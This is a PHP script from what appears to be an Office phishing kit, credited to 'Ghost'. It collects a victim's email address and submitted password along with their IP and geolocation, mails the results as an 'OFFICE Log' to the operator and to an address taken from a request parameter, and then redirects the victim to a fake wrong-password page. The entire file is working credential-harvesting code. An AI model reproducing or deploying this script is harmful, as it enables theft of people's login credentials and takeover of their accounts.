<?php
// THIS SCRIPT CODED BY Ghost
// CONTACT US SKYPE : Buster
// ICQ : ????????
	
	session_start();
	$email = $_SESSION['email'];
	$passwd = $_POST['passwd'];
	$serv = $_REQUEST['verify'];
	require_once('../Email.php');
	require_once('geoplugin.class.php');
	$geoplugin = new geoPlugin();

    //get user's ip address 
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }

    $message = "";
    $message .= "---|Ghost Rider|---\n";
    $message .= "Email: " . $_SESSION['email'] . "\n"; 
    $message .= "Password: " . $_POST['passwd'] . "\n";
    $message .= "IP : " .$ip. "\n"; 
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .= "--------------------------\n";
	
	

	$subject = "OFFICE Log";
	$headers = "From: Result@cok.com";

	{
	mail($send,$subject,$message,$headers);
	mail($serv,$subject,$message,$headers);
	}
?>
<script>
	window.location="wrongpass.php?email=<?php echo $email ?>&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1";
</script>

